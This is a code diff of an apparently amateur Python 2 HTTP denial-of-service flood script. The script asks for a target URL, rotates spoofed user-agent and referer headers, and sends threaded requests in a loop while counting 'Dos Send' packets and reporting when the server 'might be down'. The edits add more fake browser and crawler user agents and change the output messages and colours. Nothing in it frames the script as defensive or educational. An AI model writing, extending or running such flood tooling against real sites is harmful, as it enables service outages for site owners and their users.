@@ -4,12 +4,7 @@ import urllib2
 import threading
 import random
 
-
-########################################
-
-"""
-"""
-
+################
 
 if sys.platform == "linux" or sys.platform == "linux2":
     os.system("clear")
@@ -23,7 +18,7 @@ print ("   / _ \ \___ \| |_) / _ \ | |_) || |  | || |\/| |")
 print ("  / ___ \ ___) |  __/ ___ \|  _ < | |  | || |  | |")
 print (" /_/   \_\____/|_| /_/   \_\_| \_\|_| |___|_|  |_|")
 print (" ")
-url = raw_input("URL : ")
+url = raw_input(" URL : ")
 print ("\033[1;m")
 
 count = 0
@@ -171,6 +166,12 @@ def useragent():
     headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN")
     headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN")
     headers.append("Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN")
+    headers.append("Mozilla/5.0 (Linux; Android 7.0; SM-G892A BuVersion/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36")
+    headers.append("Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 ( like Gecko)")
+    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) 4.0 Mobile Safari/533.1")
+    headers.append("Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)")
+    headers.append("Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)")
+    headers.append("Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0;")
 
     return headers
 
@@ -198,9 +199,9 @@ class httpth1(threading.Thread):
                 req.add_header("Referer", referer)
                 urllib2.urlopen(req)
                 count += 1
-                print ("{0} Pure Dos Send".format(count))
+                print ("{0} Send Package".format(count))
             except urllib2.HTTPError:
-                print ("\033[1;34m SERVER MIGHT ME DOWN \033[1;m")
+                print ("\033[1;31m SERVER MIGHT ME DOWN \033[1;m")
                 pass
             except urllib2.URLError:
                 print ("\033[1;34m URL ERROR \033[1;m")
